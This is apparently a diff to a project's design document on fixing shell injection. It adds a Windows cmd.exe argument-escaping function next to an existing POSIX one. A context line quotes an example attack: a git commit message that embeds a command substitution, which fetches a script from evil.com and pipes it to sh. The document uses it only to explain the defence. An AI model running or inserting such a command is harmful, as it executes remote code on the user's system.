@@ -26,12 +26,13 @@ git commit -m "Update $(curl evil.com/script.sh | sh)"
 
 ## The Solution
 
-### 1. Shell Escape Utility
+### 1. Cross-Platform Shell Escape Utility
 
-We've implemented a robust shell escaping utility in `packages/core/src/utils/shellEscape.ts`:
+We've implemented a robust shell escaping utility in `packages/core/src/utils/shellEscape.ts` that automatically detects the operating system and applies appropriate escaping:
 
+#### POSIX Systems (Linux/macOS)
 ```typescript
-export function escapeShellArg(str: string): string {
+function escapeShellArgPosix(str: string): string {
   // Empty strings become ''
   if (str === '') return "''";
   
@@ -43,6 +44,29 @@ export function escapeShellArg(str: string): string {
   // Use single quotes to prevent ALL expansions
   // Escape single quotes by ending quote, adding \', and starting new quote
   return "'" + str.replace(/'/g, "'\\''") + "'";
+}
+```
+
+#### Windows Systems (cmd.exe)
+```typescript
+function escapeShellArgWindows(str: string): string {
+  // Empty strings become ""
+  if (str === '') return '""';
+  
+  // Check for special characters
+  const needsEscaping = /[^A-Za-z0-9_\-.]/.test(str);
+  
+  if (!needsEscaping) return str;
+  
+  let escaped = str;
+  // Escape cmd.exe metacharacters with ^
+  escaped = escaped.replace(/([&|<>^])/g, '^$1');
+  // Double up quotes
+  escaped = escaped.replace(/"/g, '""');
+  // Double percent signs
+  escaped = escaped.replace(/%/g, '%%');
+  
+  return '"' + escaped + '"';
 }
 ```
 
